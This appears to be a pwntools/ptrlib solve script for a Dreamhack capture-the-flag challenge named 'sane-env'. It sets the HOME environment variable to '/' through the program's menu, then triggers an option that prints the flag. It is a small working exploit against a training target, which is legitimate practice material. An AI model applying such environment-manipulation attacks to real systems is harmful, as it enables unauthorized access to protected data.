#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./sane-env")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 8538)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    io.sendlineafter("> ", "1")
    io.sendlineafter("name: ", "HOME")
    io.sendlineafter("value: ", "/")

    io.sendlineafter("> ", "3")

    io.recvuntil("DH{")
    flag = "DH{" + io.recvuntil("}").decode()

    print(f"flag: {flag}")
    return


if __name__ == "__main__":
    main()
